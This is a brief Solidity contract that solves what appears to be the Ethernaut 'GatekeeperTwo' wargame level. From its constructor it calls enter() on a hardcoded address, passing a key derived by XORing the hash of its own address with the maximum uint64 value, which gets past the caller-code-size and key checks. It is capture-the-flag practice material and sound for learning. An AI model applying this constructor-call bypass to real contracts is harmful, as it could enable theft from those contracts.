// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IGateKeeperTwo {
    function enter(bytes8) external returns (bool);
}

contract Attack {
    constructor() {
        IGateKeeperTwo level14 = IGateKeeperTwo(0xCe31cf66D24B5D44492B1d63d2d6d364a18d3cDc);
        level14.enter(bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this)))))^ (type(uint64).max)));
    }
}